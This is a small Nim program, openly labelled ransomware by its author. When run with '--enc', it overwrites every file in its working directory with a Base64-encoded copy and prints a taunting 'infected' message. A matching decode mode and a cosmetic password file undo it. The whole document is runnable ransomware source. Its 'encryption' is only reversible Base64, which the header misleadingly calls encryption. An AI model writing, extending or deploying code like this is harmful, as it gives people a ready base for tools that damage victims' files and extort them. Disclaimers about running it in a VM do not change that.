#[
    Author : petranol (kiavash ferdousi)
    Email : kiavashferdousi1@gmail.com
    Type : ransomeware (encryption/decryption)
    Type of Encryption : Base64 encoding
    Language : nim
    (** The Creator of this ransomeware is not responsible for any damages done use this in a vm or a place where there are no important files **)
]#

import std/base64
import os
import std/lists
import strutils as strutils
proc get_file(): SinglyLinkedList[string] =
    var ins = 0
    var ring = initSinglyLinkedList[string]()
    for kind ,path in walkDir(getCurrentDir()):
        case kind:
            of pcFile:
                if not path.contains("enc.nim") and not path.contains("enc") and not path.contains(".pass.key"):
                    ring.add(path)
            of pcDir,pcLinkToDir,pcLinkToFile :
                ins += 1
    return ring
        
proc len(a:SinglyLinkedList):int = 
    var res = 0
    for i in nodes(a):
        res += 1
    return res

proc encrypt(len:int,fstr:SinglyLinkedList[string]) : void =
    for file in fstr:
        var ft = readFile(file)
        var st = encode(ft)
        writeFile(file,st)
proc decrypt(len:int,fstr:SinglyLinkedList[string]) : void = 
    for file in fstr:
        var fcs = readFile(file)
        var st = decode(fcs)
        writeFile(file,st)

var a = get_file()
if paramStr(1) == "--enc" or paramStr(1) == "-e":
    encrypt(len(a),a)
    echo "All your files have been infected hahaha >:)"
elif paramStr(1) == "-te" or paramStr(1) == "--textenc":
    let a = readLine(stdin)
    echo encode(a)
elif paramStr(1) == "-td" or paramStr(1) == "--textdec":
    let a = readLine(stdin)
    echo decode(a)
elif paramStr(1) == "-d" or paramStr(1) == "--dec":
    if paramCount() >= 2:  
        if paramStr(2) == "-p":
            var pass = readFile(".pass.key")
            var ab:string = readLine(stdin)
            if ab == pass:
                decrypt(len(a),a)   
    else: 
        decrypt(len(a),a)
    echo "Your files have been decoded and safe and have great time"
elif paramStr(1) == "-dp":
    var pass = readFile(".pass.key")
    var ab = readLine(stdin)
    if ab == pass:
        decrypt(len(a),a) 
elif paramStr(1) == "-v" or paramStr(1) == "--version":
    echo "version 0.0.1 of nim file encryption/decryption (to/from base64-encoding) ransomeware"
elif paramStr(1) == "-h" or paramStr(1) == "--help":
    echo "-e | --enc : encrypts all file in the same directory"
    echo "-d | --dec [option = -p (with password the password is in .pass.key)] : decrypts all file in the same directory"
    echo "-v | --version : prints the version of the software"
else:
    echo "command ",paramStr(1)," not found"
